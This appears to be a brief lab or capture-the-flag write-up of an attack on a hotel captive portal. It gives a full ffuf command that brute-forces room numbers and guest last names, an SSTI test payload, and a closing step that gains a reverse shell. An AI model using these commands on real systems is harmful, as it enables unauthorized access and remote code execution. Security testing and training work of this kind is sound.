## Use case

The captive portal allowed for brute forcing of room numbers and last names, leading to unauthorized access. This access enabled exploitation of a Server Side Template Injection (SSTI) vulnerability to execute arbitrary code on the server.

## Steps to test

1. Generate a list of room numbers from 101 to 304 using 'seq 101 304 > rooms'.
2. Use ffuf to brute force the login endpoint with the command: 'ffuf -X POST -u http://10.1.111.195/login -w ./rooms:ROOMS -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_number=ROOMS&last_name=FUZZ' -fr 'Authentication failed. No active reservation matching room and last name.'
3. Identify a successful login response indicating valid credentials.
4. Modify the user's display name to include an SSTI payload such as '{{7*7}}'.
5. Observe the output to confirm code execution, indicating successful exploitation of SSTI.
6. Execute a reverse shell payload to gain remote access.
